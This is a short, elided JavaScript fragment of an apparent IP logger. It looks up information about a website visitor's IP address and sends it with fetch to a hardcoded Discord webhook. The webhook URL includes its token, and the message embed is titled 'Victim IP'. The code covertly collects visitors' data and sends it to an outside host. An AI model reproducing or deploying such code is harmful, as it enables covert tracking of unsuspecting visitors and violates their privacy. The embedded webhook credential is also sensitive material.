...
const webhook = "https://discord.com/api/webhooks/1219366839990358096/iM9auqrOHlPW4i-Q_ms2foaPExMm4gs8ZsU9ZA--vDFTuTTBg9uk2zzYWyRR9xMlk1C0"
  ...
  IP_Info().then((value)=> {
    ...
    if(value !== null){
       await fetch(webhook, {
        ...
        body: JSON.stringify({
          content:"<@1016394950461632522>",
          embeds: [{
              title: "Victim IP",
              type:"rich",
              color: "12223968",
              description: "```@kojneeem IP information of the recent website visitor.```",
              fields: [{
